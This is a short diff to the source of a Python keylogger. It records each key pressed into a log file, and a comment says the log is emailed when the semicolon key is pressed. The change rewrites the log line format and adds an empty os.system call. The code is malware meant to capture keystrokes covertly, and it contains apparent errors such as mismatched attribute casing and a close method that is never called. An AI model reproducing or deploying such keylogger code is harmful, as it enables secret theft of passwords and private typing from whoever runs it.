@@ -154,6 +154,7 @@ try:
       fob=open(log_file,'a')
       fob.write(event.Key)
       fob.write(f"this key did pressed {event.key} \n")
+      os.system("")
 
       if event.Ascii==59: #59 this value is represented for ; if this key pressed it'll stop the keylogger and will send the email
         fob.close()
@@ -172,7 +173,7 @@ try:
     def OnKeyboardEvent(event):
       fob=open(log_file,"a")
       fob.write(event.Key)
-      fob.write("\n")
+      fob.write(f"this key did pressed {event.key} \n")
  
       if event.Ascii==59:
         fob.close
